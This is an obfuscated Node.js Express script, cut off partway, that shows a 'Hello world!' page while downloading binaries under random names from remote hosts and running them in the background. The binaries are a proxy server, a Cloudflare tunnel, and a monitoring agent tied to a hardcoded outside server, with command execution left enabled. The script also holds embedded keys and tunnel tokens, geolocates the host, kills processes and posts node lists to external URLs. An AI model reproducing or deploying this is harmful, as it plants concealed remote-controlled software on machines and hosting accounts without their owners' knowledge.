const _0xce4c1e=_0x130c;(function(_0x1d4378,_0x224f21){const _0x4e7da5={_0x4cc75a:0x1bb,_0x120d73:0x132,_0x5e9a87:0x1a3,_0x2fa25a:0x1a1,_0xb2ed40:0x181},_0x19e84c=_0x130c,_0x26fc91=_0x1d4378();while(!![]){try{const _0x1eba28=-parseInt(_0x19e84c(0x12d))/0x1+-parseInt(_0x19e84c(_0x4e7da5._0x4cc75a))/0x2+parseInt(_0x19e84c(0x1dd))/0x3+-parseInt(_0x19e84c(0x1de))/0x4*(-parseInt(_0x19e84c(0x1ae))/0x5)+-parseInt(_0x19e84c(_0x4e7da5._0x120d73))/0x6*(-parseInt(_0x19e84c(_0x4e7da5._0x5e9a87))/0x7)+parseInt(_0x19e84c(0x193))/0x8*(parseInt(_0x19e84c(0x14a))/0x9)+-parseInt(_0x19e84c(_0x4e7da5._0x2fa25a))/0xa*(parseInt(_0x19e84c(_0x4e7da5._0xb2ed40))/0xb);if(_0x1eba28===_0x224f21)break;else _0x26fc91['push'](_0x26fc91['shift']());}catch(_0x4d5903){_0x26fc91['push'](_0x26fc91['shift']());}}}(_0x30bf,0x4ecc2));const express=require(_0xce4c1e(0x127)),app=express(),axios=require(_0xce4c1e(0x198)),os=require('os'),fs=require('fs'),path=require(_0xce4c1e(0x1ce)),{promisify}=require('util'),exec=promisify(require(_0xce4c1e(0x17a))[_0xce4c1e(0x1a0)]),{execSync}=require(_0xce4c1e(0x17a)),UPLOAD_URL=process['env'][_0xce4c1e(0x146)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0xce4c1e(0x1cd)][_0xce4c1e(0x18f)]||![],FILE_PATH=process[_0xce4c1e(0x1cd)][_0xce4c1e(0x17d)]||_0xce4c1e(0x1b0),SUB_PATH=process[_0xce4c1e(0x1cd)][_0xce4c1e(0x1c4)]||'dpd',PORT=process[_0xce4c1e(0x1cd)][_0xce4c1e(0x19d)]||process['env'][_0xce4c1e(0x1e2)]||0xbb8,UUID=process[_0xce4c1e(0x1cd)][_0xce4c1e(0x138)]||_0xce4c1e(0x1cb),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'miqvsydcpafl.us-west-1.clawcloudrun.com:80',NEZHA_PORT=process['env'][_0xce4c1e(0x18b)]||'',NEZHA_KEY=process[_0xce4c1e(0x1cd)][_0xce4c1e(0x12b)]||'Rp1e9SpChViPAwbpE2aW1Njj5r4g1DBa',ARGO_DOMAIN=process[_0xce4c1e(0x1cd)]['ARGO_DOMAIN']||_0xce4c1e(0x1d6),ARGO_AUTH=process[_0xce4c1e(0x1cd)]['ARGO_AUTH']||'eyJhIjoiODBjNzdhMWUyZjBiMTdiYWQ0Njc0NjQ4YTc3YjVhZjIiLCJ0IjoiYThkODIwZTctZDQwMS00MDViLTk1M2QtOGFiODMyN2RlNTBjIiwicyI6Ik5EUmxPRGxtTjJZdE9UUXhPUzAwWVRjMkxXSmhNMlV0TnpsallUUXdNbVptWkRReiJ9',ARGO_PORT=process[_0xce4c1e(0x1cd)][_0xce4c1e(0x1da)]||0x1f41,CFIP=process[_0xce4c1e(0x1cd)][_0xce4c1e(0x161)]||'cdns.doon.eu.org',CFPORT=process[_0xce4c1e(0x1cd)][_0xce4c1e(0x159)]||0x1bb,NAME=process[_0xce4c1e(0x1cd)][_0xce4c1e(0x195)]||_0xce4c1e(0x1ba);!fs['existsSync'](FILE_PATH)?(fs[_0xce4c1e(0x14f)](FILE_PATH),console[_0xce4c1e(0x18a)](FILE_PATH+'\x20is\x20created')):console[_0xce4c1e(0x18a)](FILE_PATH+_0xce4c1e(0x13c));function _0x30bf(){const _0x57c430=['win32','log','NEZHA_PORT','config.json','tunnel.yml','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','AUTO_ACCESS','boot.log','8443','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','39992HRyYaX','block','NAME','push','Error\x20downloading\x20files:','axios','\x20-c\x20\x22','readFileSync','/api/add-subscriptions','quic','SERVER_PORT','stringify','utf-8','exec','490YmvpZF','includes','2177koMvQu','Empowerment\x20failed\x20for\x20','npm\x20running\x20error:\x20','tls','/sub.txt\x20saved\x20successfully','https://arm64.ssss.nyc.mn/web','TunnelSecret','clear','&path=%2Fvless-argo%3Fed%3D2560#','\x20>\x20nul\x202>&1','base64','5MUNktk','pipe','./tmp','toString','firefox','tunnel.json','127.0.0.1','\x22\x20>\x20/dev/null\x202>&1','blackhole','\x0avless://','Error\x20reading\x20boot.log:','--tls','Leaflow','134516iiwQZo','statSync','fileName','Unhandled\x20error\x20in\x20startserver:','charAt','list.txt','\x0aclient_secret:\x20','vless','\x20successfully','SUB_PATH','2087','Download\x20','arm','readdirSync','https://arm64.ssss.nyc.mn/v1','\x20-s\x20','3f92a381-a6da-4a85-ae32-35fd60f76c03','Subscription\x20uploaded\x20successfully','env','path','arm64','2096','set','vmess','http','response','/trojan-argo','leaf.kevin.edu.kg','.exe\x20>\x20nul\x202>&1','existsSync','/vmess-argo','ARGO_PORT','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x20>/dev/null\x202>&1\x20&','375192khCksc','1503916bxjnUN','443','finish','/vless-argo','PORT','2053','status','text/plain;\x20charset=utf-8','express','close','abcdefghijklmnopqrstuvwxyz','chmod','NEZHA_KEY','data','307720CsBbtd','unlinkSync','freedom','aarch64','web\x20running\x20error:\x20','9654bWnjIz','arch','country_code','xtls-rprx-vision','false','tcp','UUID','https://amd64.ssss.nyc.mn/v1','https://amd64.ssss.nyc.mn/web','post','\x20already\x20exists','platform','direct','message','error','pop','get','amd','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','UPLOAD_URL','App\x20is\x20running','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','send','369NkRJJw','2083','basename','countryCode','join','mkdirSync','Add\x20automatic\x20access\x20task\x20faild:\x20','stream','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','taskkill\x20/f\x20/im\x20','match','https://arm64.ssss.nyc.mn/bot','isFile','org','&fp=firefox&type=ws&host=','CFPORT','\x20-p\x20','\x20-c\x20','map','ArgoDomain:','success','\x20is\x20running','listen','CFIP','writeFileSync','https://oooo.serv00.net/add-url','sub.txt','/dev/null','unlink','Error\x20executing\x20command:\x20','application/json','none','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','automatic\x20access\x20task\x20added\x20successfully','NEZHA\x20variable\x20is\x20empty,skip\x20running','filter','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','nohup\x20','unshift','Empowerment\x20success\x20for\x20','https+local://8.8.8.8/dns-query','/api/delete-nodes','has','Hello\x20world!','?encryption=none&security=tls&sni=','from','child_process','split','all','FILE_PATH','Nodes\x20uploaded\x20successfully','length','\x20>/dev/null\x202>&1','114191LCimHN','forEach','pkill\x20-f\x20\x22[','fileUrl','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20failed:\x20','Error\x20in\x20startserver:','&path=%2Ftrojan-argo%3Fed%3D2560#'];_0x30bf=function(){return _0x57c430;};return _0x30bf();}function _0x130c(_0x3d0f26,_0x2653a9){const _0x30bf32=_0x30bf();return _0x130c=function(_0x130c9b,_0x2b17e0){_0x130c9b=_0x130c9b-0x127;let _0x28902d=_0x30bf32[_0x130c9b];return _0x28902d;},_0x130c(_0x3d0f26,_0x2653a9);}function generateRandomName(){const _0x187146={_0x1d878d:0x17f},_0x52d03a=_0xce4c1e,_0x4c386c=_0x52d03a(0x129);let _0x48428e='';for(let _0x299561=0x0;_0x299561<0x6;_0x299561++){_0x48428e+=_0x4c386c['charAt'](Math['floor'](Math['random']()*_0x4c386c[_0x52d03a(_0x187146._0x1d878d)]));}return _0x48428e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xce4c1e(0x14e)](FILE_PATH,npmName),phpPath=path[_0xce4c1e(0x14e)](FILE_PATH,phpName),webPath=path[_0xce4c1e(0x14e)](FILE_PATH,webName),botPath=path[_0xce4c1e(0x14e)](FILE_PATH,botName),subPath=path[_0xce4c1e(0x14e)](FILE_PATH,_0xce4c1e(0x164)),listPath=path[_0xce4c1e(0x14e)](FILE_PATH,_0xce4c1e(0x1c0)),bootLogPath=path['join'](FILE_PATH,_0xce4c1e(0x190)),configPath=path['join'](FILE_PATH,_0xce4c1e(0x18c));function deleteNodes(){const _0x43df15={_0x1d8774:0x19a,_0x5ca17b:0x19f,_0x2fee5b:0x16e,_0x33a0da:0x17f,_0x57e1d5:0x175,_0x37c0ca:0x19e},_0x505ac9=_0xce4c1e;try{if(!UPLOAD_URL)return;if(!fs[_0x505ac9(0x1d8)](subPath))return;let _0x1c3484;try{_0x1c3484=fs[_0x505ac9(_0x43df15._0x1d8774)](subPath,_0x505ac9(_0x43df15._0x5ca17b));}catch{return null;}const _0x27948b=Buffer[_0x505ac9(0x179)](_0x1c3484,'base64')[_0x505ac9(0x1b1)](_0x505ac9(_0x43df15._0x5ca17b)),_0x2987e5=_0x27948b['split']('\x0a')[_0x505ac9(_0x43df15._0x2fee5b)](_0x43ca07=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x43ca07));if(_0x2987e5[_0x505ac9(_0x43df15._0x33a0da)]===0x0)return;return axios[_0x505ac9(0x13b)](UPLOAD_URL+_0x505ac9(_0x43df15._0x57e1d5),JSON[_0x505ac9(_0x43df15._0x37c0ca)]({'nodes':_0x2987e5}),{'headers':{'Content-Type':_0x505ac9(0x168)}})['catch'](_0x42235e=>{return null;}),null;}catch(_0x3888f4){return null;}}function cleanupOldFiles(){const _0x5a8a33={_0x525a5b:0x1c8,_0x39b2c8:0x182},_0x3327f9={_0x4a75a7:0x14e,_0x565b67:0x156},_0x562d47=_0xce4c1e;try{const _0x2a9405=fs[_0x562d47(_0x5a8a33._0x525a5b)](FILE_PATH);_0x2a9405[_0x562d47(_0x5a8a33._0x39b2c8)](_0x2ba672=>{const _0x42df8e=_0x562d47,_0x322323=path[_0x42df8e(_0x3327f9._0x4a75a7)](FILE_PATH,_0x2ba672);try{const _0x667b26=fs[_0x42df8e(0x1bc)](_0x322323);_0x667b26[_0x42df8e(_0x3327f9._0x565b67)]()&&fs['unlinkSync'](_0x322323);}catch(_0x48d07f){}});}catch(_0xc5124a){}}app[_0xce4c1e(0x142)]('/',function(_0x12c979,_0x472b30){const _0x97ad4d={_0x24f2ab:0x177},_0x115bf6=_0xce4c1e;_0x472b30[_0x115bf6(0x149)](_0x115bf6(_0x97ad4d._0x24f2ab));});async function generateConfig(){const _0x490b8c={_0x1828a8:0x1c2,_0x48041c:0x135,_0xdbcf9e:0x1e1,_0x213b32:0x1b4,_0x5b4e01:0x169,_0x40742b:0x137,_0x3a06a0:0x1e1,_0x9e0b10:0x1d3,_0x35b244:0x1b4,_0x3f7751:0x1d9,_0x18868f:0x1a6,_0x47f7c3:0x1b4,_0x221dba:0x12f,_0x4d2ab2:0x14e,_0x48384f:0x18c},_0x11b224=_0xce4c1e,_0x12fdad={'log':{'access':_0x11b224(0x165),'error':_0x11b224(0x165),'loglevel':_0x11b224(0x169)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x11b224(_0x490b8c._0x1828a8),'settings':{'clients':[{'id':UUID,'flow':_0x11b224(_0x490b8c._0x48041c)}],'decryption':_0x11b224(0x169),'fallbacks':[{'dest':0xbb9},{'path':_0x11b224(_0x490b8c._0xdbcf9e),'dest':0xbba},{'path':_0x11b224(0x1d9),'dest':0xbbb},{'path':_0x11b224(0x1d5),'dest':0xbbc}]},'streamSettings':{'network':_0x11b224(0x137)}},{'port':0xbb9,'listen':_0x11b224(_0x490b8c._0x213b32),'protocol':_0x11b224(_0x490b8c._0x1828a8),'settings':{'clients':[{'id':UUID}],'decryption':_0x11b224(_0x490b8c._0x5b4e01)},'streamSettings':{'network':_0x11b224(_0x490b8c._0x40742b),'security':_0x11b224(_0x490b8c._0x5b4e01)}},{'port':0xbba,'listen':_0x11b224(0x1b4),'protocol':_0x11b224(0x1c2),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x11b224(0x169)},'streamSettings':{'network':'ws','security':_0x11b224(0x169),'wsSettings':{'path':_0x11b224(_0x490b8c._0x3a06a0)}},'sniffing':{'enabled':!![],'destOverride':[_0x11b224(_0x490b8c._0x9e0b10),_0x11b224(0x1a6),_0x11b224(0x19c)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x11b224(_0x490b8c._0x35b244),'protocol':_0x11b224(0x1d2),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x11b224(_0x490b8c._0x3f7751)}},'sniffing':{'enabled':!![],'destOverride':[_0x11b224(_0x490b8c._0x9e0b10),_0x11b224(_0x490b8c._0x18868f),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x11b224(_0x490b8c._0x47f7c3),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x11b224(_0x490b8c._0x5b4e01),'wsSettings':{'path':_0x11b224(0x1d5)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x11b224(_0x490b8c._0x18868f),_0x11b224(0x19c)],'metadataOnly':![]}}],'dns':{'servers':[_0x11b224(0x174)]},'outbounds':[{'protocol':_0x11b224(_0x490b8c._0x221dba),'tag':_0x11b224(0x13e)},{'protocol':_0x11b224(0x1b6),'tag':_0x11b224(0x194)}]};fs['writeFileSync'](path[_0x11b224(_0x490b8c._0x4d2ab2)](FILE_PATH,_0x11b224(_0x490b8c._0x48384f)),JSON[_0x11b224(0x19e)](_0x12fdad,null,0x2));}function getSystemArchitecture(){const _0x3aacaa={_0xa42bc0:0x1c7},_0x54e718=_0xce4c1e,_0x4fbca7=os[_0x54e718(0x133)]();return _0x4fbca7===_0x54e718(_0x3aacaa._0xa42bc0)||_0x4fbca7===_0x54e718(0x1cf)||_0x4fbca7===_0x54e718(0x130)?_0x54e718(0x1c7):_0x54e718(0x143);}function downloadFile(_0x1a183d,_0x3cf1b1,_0x432bc5){const _0x474e34={_0x14b9b7:0x14f,_0x2fdf27:0x142},_0x410b1d={_0x3bddfd:0x140},_0x22ef29={_0x43a02f:0x1c6},_0x32fabf=_0xce4c1e,_0x3bc26d=_0x1a183d;!fs['existsSync'](FILE_PATH)&&fs[_0x32fabf(_0x474e34._0x14b9b7)](FILE_PATH,{'recursive':!![]});const _0x415179=fs['createWriteStream'](_0x3bc26d);axios({'method':_0x32fabf(_0x474e34._0x2fdf27),'url':_0x3cf1b1,'responseType':_0x32fabf(0x151)})['then'](_0x3a89d6=>{const _0x1fa499={_0x4d8678:0x18a,_0x20c83f:0x1c3},_0x2a55aa=_0x32fabf;_0x3a89d6[_0x2a55aa(0x12c)][_0x2a55aa(0x1af)](_0x415179),_0x415179['on'](_0x2a55aa(0x1e0),()=>{const _0x5ca361=_0x2a55aa;_0x415179[_0x5ca361(0x128)](),console[_0x5ca361(_0x1fa499._0x4d8678)](_0x5ca361(0x1c6)+path[_0x5ca361(0x14c)](_0x3bc26d)+_0x5ca361(_0x1fa499._0x20c83f)),_0x432bc5(null,_0x3bc26d);}),_0x415179['on'](_0x2a55aa(0x140),_0x3d1723=>{const _0x426f18=_0x2a55aa;fs[_0x426f18(0x166)](_0x3bc26d,()=>{});const _0xa5abff=_0x426f18(_0x22ef29._0x43a02f)+path['basename'](_0x3bc26d)+'\x20failed:\x20'+_0x3d1723['message'];console[_0x426f18(0x140)](_0xa5abff),_0x432bc5(_0xa5abff);});})['catch'](_0x2d8718=>{const _0x397999=_0x32fabf,_0x1a0772=_0x397999(0x1c6)+path[_0x397999(0x14c)](_0x3bc26d)+_0x397999(0x186)+_0x2d8718[_0x397999(0x13f)];console[_0x397999(_0x410b1d._0x3bddfd)](_0x1a0772),_0x432bc5(_0x1a0772);});}async function downloadFilesAndRun(){const _0x396795={_0x50b452:0x15c,_0x10badf:0x197,_0x5337a5:0x1a2,_0x313f59:0x17b,_0x2a06dc:0x141,_0x279b48:0x176,_0x2ba450:0x136,_0x42389e:0x162,_0x22eaf8:0x18a,_0x4b0b5f:0x15f,_0x24d9d5:0x1df,_0x65bc7e:0x191,_0x25eaaa:0x1e3,_0x3a725e:0x1b9,_0x8da91:0x1ca,_0x45689e:0x15f,_0x3b04c1:0x140,_0x2b40f8:0x15b,_0x2af610:0x1dc,_0x3bbc11:0x167},_0x1bf544={_0x54dc6a:0x184},_0x2566e3=_0xce4c1e,_0x53e739=getSystemArchitecture(),_0x2b72f7=getFilesForArchitecture(_0x53e739);if(_0x2b72f7[_0x2566e3(0x17f)]===0x0){console[_0x2566e3(0x18a)](_0x2566e3(0x148));return;}const _0x57a164=_0x2b72f7[_0x2566e3(_0x396795._0x50b452)](_0x23a82b=>{return new Promise((_0x58f469,_0x54c200)=>{const _0x38eba8=_0x130c;downloadFile(_0x23a82b[_0x38eba8(0x1bd)],_0x23a82b[_0x38eba8(_0x1bf544._0x54dc6a)],(_0x4b1302,_0x137cc8)=>{_0x4b1302?_0x54c200(_0x4b1302):_0x58f469(_0x137cc8);});});});try{await Promise[_0x2566e3(0x17c)](_0x57a164);}catch(_0x514030){console['error'](_0x2566e3(_0x396795._0x10badf),_0x514030);return;}function _0x32b719(_0x5292a9){const _0x58443e={_0x46b21c:0x1d8,_0x35a0d7:0x12a},_0x3d8b9a=0x1fd;_0x5292a9['forEach'](_0x223c72=>{const _0x579343={_0x1529aa:0x140,_0x1dbc2:0x1a4,_0x4074ab:0x18a,_0x2ee5bf:0x173,_0x37c89e:0x1b1},_0x3f7c58=_0x130c;fs[_0x3f7c58(_0x58443e._0x46b21c)](_0x223c72)&&fs[_0x3f7c58(_0x58443e._0x35a0d7)](_0x223c72,_0x3d8b9a,_0x1fcf82=>{const _0x3fe280=_0x3f7c58;_0x1fcf82?console[_0x3fe280(_0x579343._0x1529aa)](_0x3fe280(_0x579343._0x1dbc2)+_0x223c72+':\x20'+_0x1fcf82):console[_0x3fe280(_0x579343._0x4074ab)](_0x3fe280(_0x579343._0x2ee5bf)+_0x223c72+':\x20'+_0x3d8b9a[_0x3fe280(_0x579343._0x37c89e)](0x8));});});}const _0x54ef69=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x32b719(_0x54ef69);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x100ea2=NEZHA_SERVER[_0x2566e3(_0x396795._0x5337a5)](':')?NEZHA_SERVER[_0x2566e3(_0x396795._0x313f59)](':')[_0x2566e3(_0x396795._0x2a06dc)]():'',_0x582caa=new Set([_0x2566e3(0x1df),'8443',_0x2566e3(0x1d0),_0x2566e3(0x1c5),_0x2566e3(0x14b),_0x2566e3(0x1e3)]),_0x21e2f8=_0x582caa[_0x2566e3(_0x396795._0x279b48)](_0x100ea2)?'true':_0x2566e3(_0x396795._0x2ba450),_0x496ad1=_0x2566e3(0x1c1)+NEZHA_KEY+_0x2566e3(0x18e)+NEZHA_SERVER+_0x2566e3(0x144)+_0x21e2f8+_0x2566e3(0x145)+UUID;fs[_0x2566e3(_0x396795._0x42389e)](path[_0x2566e3(0x14e)](FILE_PATH,'config.yaml'),_0x496ad1);const _0x4424f5=_0x2566e3(0x171)+phpPath+_0x2566e3(0x199)+FILE_PATH+_0x2566e3(0x192);try{await exec(_0x4424f5),console[_0x2566e3(_0x396795._0x22eaf8)](phpName+_0x2566e3(_0x396795._0x4b0b5f)),await new Promise(_0xadf0da=>setTimeout(_0xadf0da,0x3e8));}catch(_0x12fbd9){console[_0x2566e3(0x140)]('php\x20running\x20error:\x20'+_0x12fbd9);}}else{let _0x369445='';const _0x5e3e0c=[_0x2566e3(_0x396795._0x24d9d5),_0x2566e3(_0x396795._0x65bc7e),'2096',_0x2566e3(0x1c5),'2083',_0x2566e3(_0x396795._0x25eaaa)];_0x5e3e0c[_0x2566e3(0x1a2)](NEZHA_PORT)&&(_0x369445=_0x2566e3(_0x396795._0x3a725e));const _0x177568='nohup\x20'+npmPath+_0x2566e3(_0x396795._0x8da91)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2566e3(0x15a)+NEZHA_KEY+'\x20'+_0x369445+_0x2566e3(0x16a);try{await exec(_0x177568),console[_0x2566e3(_0x396795._0x22eaf8)](npmName+_0x2566e3(_0x396795._0x45689e)),await new Promise(_0x1fa806=>setTimeout(_0x1fa806,0x3e8));}catch(_0x58a465){console[_0x2566e3(_0x396795._0x3b04c1)](_0x2566e3(0x1a5)+_0x58a465);}}}else console['log'](_0x2566e3(0x16d));const _0x2bd4a3='nohup\x20'+webPath+_0x2566e3(_0x396795._0x2b40f8)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2bd4a3),console[_0x2566e3(0x18a)](webName+_0x2566e3(_0x396795._0x45689e)),await new Promise(_0xbd247=>setTimeout(_0xbd247,0x3e8));}catch(_0x149ded){console[_0x2566e3(0x140)](_0x2566e3(0x131)+_0x149ded);}if(fs['existsSync'](botPath)){let _0x48eed5;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x48eed5='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x2566e3(0x154)](/TunnelSecret/)?_0x48eed5='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x48eed5=_0x2566e3(0x16b)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x2566e3(0x171)+botPath+'\x20'+_0x48eed5+_0x2566e3(_0x396795._0x2af610)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x30494a=>setTimeout(_0x30494a,0x7d0));}catch(_0xcaf81c){console['error'](_0x2566e3(_0x396795._0x3bbc11)+_0xcaf81c);}}await new Promise(_0x8744cc=>setTimeout(_0x8744cc,0x1388));}function getFilesForArchitecture(_0x2c9a56){const _0x1cb62e={_0x189f9b:0x1c7,_0x215f7e:0x1c7,_0x40a07b:0x1c9},_0xd1e7ec=_0xce4c1e;let _0xc953c4;_0x2c9a56===_0xd1e7ec(_0x1cb62e._0x189f9b)?_0xc953c4=[{'fileName':webPath,'fileUrl':_0xd1e7ec(0x1a8)},{'fileName':botPath,'fileUrl':_0xd1e7ec(0x155)}]:_0xc953c4=[{'fileName':webPath,'fileUrl':_0xd1e7ec(0x13a)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x479373=_0x2c9a56===_0xd1e7ec(0x1c7)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0xc953c4[_0xd1e7ec(0x172)]({'fileName':npmPath,'fileUrl':_0x479373});}else{const _0x5e48b1=_0x2c9a56===_0xd1e7ec(_0x1cb62e._0x215f7e)?_0xd1e7ec(_0x1cb62e._0x40a07b):_0xd1e7ec(0x139);_0xc953c4['unshift']({'fileName':phpPath,'fileUrl':_0x5e48b1});}}return _0xc953c4;}function argoType(){const _0x1afb98={_0x56ddfc:0x152,_0x59a8c6:0x1a9,_0x13deea:0x17b,_0x408d11:0x14e,_0xad2df5:0x1b3,_0x573370:0x170,_0x43ca7b:0x162,_0x3997e3:0x18d},_0xfa9984=_0xce4c1e;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0xfa9984(_0x1afb98._0x56ddfc));return;}if(ARGO_AUTH[_0xfa9984(0x1a2)](_0xfa9984(_0x1afb98._0x59a8c6))){fs['writeFileSync'](path['join'](FILE_PATH,_0xfa9984(0x1b3)),ARGO_AUTH);const _0x156504='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0xfa9984(_0x1afb98._0x13deea)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0xfa9984(_0x1afb98._0x408d11)](FILE_PATH,_0xfa9984(_0x1afb98._0xad2df5))+_0xfa9984(_0x1afb98._0x573370)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0xfa9984(_0x1afb98._0x43ca7b)](path[_0xfa9984(0x14e)](FILE_PATH,_0xfa9984(_0x1afb98._0x3997e3)),_0x156504);}else console[_0xfa9984(0x18a)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x492121={_0x3fdc9f:0x18a,_0x2b5cd5:0x19a,_0x198acb:0x14e,_0x188e11:0x17b,_0x4e8309:0x182,_0x7da378:0x18a,_0x19079e:0x185,_0x4fcf99:0x12e,_0x16792c:0x1db,_0x41ea30:0x171,_0x48921c:0x18a,_0x35d8fe:0x1b8},_0x5d2c5d={_0x4674cd:0x134,_0xe5b10b:0x12c,_0x9bbf9c:0x12c,_0x252fc1:0x15e,_0x3f6dc2:0x12c,_0x361125:0x157,_0x32e268:0x14d,_0xb787ea:0x12c,_0x132108:0x157},_0x8b5d7a={_0x305ed4:0x13d,_0x187636:0x1b5},_0x2cc425=_0xce4c1e;let _0x190eac;if(ARGO_AUTH&&ARGO_DOMAIN)_0x190eac=ARGO_DOMAIN,console[_0x2cc425(_0x492121._0x3fdc9f)]('ARGO_DOMAIN:',_0x190eac),await _0x271039(_0x190eac);else try{const _0xb25038=fs[_0x2cc425(_0x492121._0x2b5cd5)](path[_0x2cc425(_0x492121._0x198acb)](FILE_PATH,_0x2cc425(0x190)),_0x2cc425(0x19f)),_0x1fc244=_0xb25038[_0x2cc425(_0x492121._0x188e11)]('\x0a'),_0x593404=[];_0x1fc244[_0x2cc425(_0x492121._0x4e8309)](_0x2a5646=>{const _0x39be26=_0x2a5646['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x39be26){const _0x13df28=_0x39be26[0x1];_0x593404['push'](_0x13df28);}});if(_0x593404[_0x2cc425(0x17f)]>0x0)_0x190eac=_0x593404[0x0],console[_0x2cc425(_0x492121._0x7da378)](_0x2cc425(0x15d),_0x190eac),await _0x271039(_0x190eac);else{console['log'](_0x2cc425(_0x492121._0x19079e)),fs[_0x2cc425(_0x492121._0x4fcf99)](path[_0x2cc425(_0x492121._0x198acb)](FILE_PATH,'boot.log'));async function _0x21debe(){const _0x3cf8fe=_0x2cc425;try{process[_0x3cf8fe(_0x8b5d7a._0x305ed4)]===_0x3cf8fe(0x189)?await exec(_0x3cf8fe(0x153)+botName+_0x3cf8fe(0x1d7)):await exec(_0x3cf8fe(0x183)+botName[_0x3cf8fe(0x1bf)](0x0)+']'+botName['substring'](0x1)+_0x3cf8fe(_0x8b5d7a._0x187636));}catch(_0x86ffc2){}}_0x21debe(),await new Promise(_0x512caf=>setTimeout(_0x512caf,0xbb8));const _0x21ea8c=_0x2cc425(0x16b)+FILE_PATH+_0x2cc425(_0x492121._0x16792c)+ARGO_PORT;try{await exec(_0x2cc425(_0x492121._0x41ea30)+botPath+'\x20'+_0x21ea8c+'\x20>/dev/null\x202>&1\x20&'),console[_0x2cc425(_0x492121._0x48921c)](botName+'\x20is\x20running'),await new Promise(_0x3b5e9f=>setTimeout(_0x3b5e9f,0xbb8)),await extractDomains();}catch(_0x2a5ea7){console['error']('Error\x20executing\x20command:\x20'+_0x2a5ea7);}}}catch(_0x354822){console[_0x2cc425(0x140)](_0x2cc425(_0x492121._0x35d8fe),_0x354822);}async function _0x3376a5(){const _0x14f883=_0x2cc425;try{const _0x47043f=await axios['get']('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x47043f[_0x14f883(0x12c)]&&_0x47043f[_0x14f883(0x12c)][_0x14f883(_0x5d2c5d._0x4674cd)]&&_0x47043f[_0x14f883(_0x5d2c5d._0xe5b10b)][_0x14f883(0x157)])return _0x47043f['data'][_0x14f883(0x134)]+'_'+_0x47043f[_0x14f883(_0x5d2c5d._0xe5b10b)][_0x14f883(0x157)];}catch(_0x3dd549){try{const _0x5e3ae3=await axios[_0x14f883(0x142)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x5e3ae3[_0x14f883(_0x5d2c5d._0x9bbf9c)]&&_0x5e3ae3[_0x14f883(0x12c)][_0x14f883(0x1e4)]===_0x14f883(_0x5d2c5d._0x252fc1)&&_0x5e3ae3[_0x14f883(0x12c)][_0x14f883(0x14d)]&&_0x5e3ae3[_0x14f883(_0x5d2c5d._0x3f6dc2)][_0x14f883(_0x5d2c5d._0x361125)])return 